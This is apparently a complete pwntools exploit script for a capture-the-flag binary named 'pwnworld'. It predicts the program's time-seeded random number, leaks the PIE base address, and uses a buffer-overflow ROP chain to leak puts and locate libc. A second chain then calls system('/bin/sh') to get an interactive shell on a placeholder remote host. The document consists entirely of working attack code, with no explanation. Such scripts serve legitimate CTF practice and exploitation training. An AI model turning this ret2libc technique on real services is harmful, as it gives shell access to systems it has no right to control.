#!/usr/bin/env python3
from pwn import *
from ctypes import CDLL, c_void_p

libcc = CDLL("libc.so.6")

def getRand():
    current_time = libcc.time(0)
    libcc.srand(current_time)
    return libcc.rand() % 417

exe = ELF("./pwnworld")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
# ld = ELF("./ld-2.37.so")

elf = context.binary = exe
context.log_level = 'DEBUG'


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r

padding = 280
def main():
    r = conn()

    # good luck pwning :)
    info(f'{getRand()}')
    r.sendlineafter(b'? ', f'{getRand()}'.encode())
    # pause()
    r.recvuntil(b'you: ')
    leak = int(r.recvline(), 16)
    base = leak - 0x404c
    pause()
    info(f'leak PIEBASE -> {hex(base)}')
    # pause()
    pop_rdi = base + 0x00000000000012b5
    ret_address = base + 0x000000000000101a
    info(f'pop_rdi -> {hex(pop_rdi)}')
    puts_got = elf.got['puts']
    puts_plt = elf.plt.puts
    payload = flat(
        b'A' * 280,
        pop_rdi,
        base + puts_got,
        base + puts_plt,
        base + elf.sym['main']
    )
    # pause()
    r.sendlineafter(b'feedback? ', payload)
    r.recvuntil(b'See yaa\n')
    leaked = r.recvline()
    libc_leaked = unpack(leaked.strip().ljust(8, b'\x00'))
    info(f'libc leaked -> {hex(libc_leaked)}')
    libc.address = libc_leaked - libc.sym['puts']
    # print(leak)
    info(f'libc puts leaked -> {hex(libc.address)}')
    r.sendlineafter(b'? ', f'{getRand()}'.encode())
    payload2 = flat(
        b'A' * 280,
        pop_rdi,
        next(libc.search(b"/bin/sh\x00")),
        ret_address,
        # ret_address,
        libc.sym.system,
    )
    r.sendlineafter(b'? ', payload2)
     
    # pause()
    # r.recvline()
    r.interactive()


if __name__ == "__main__":
    main()
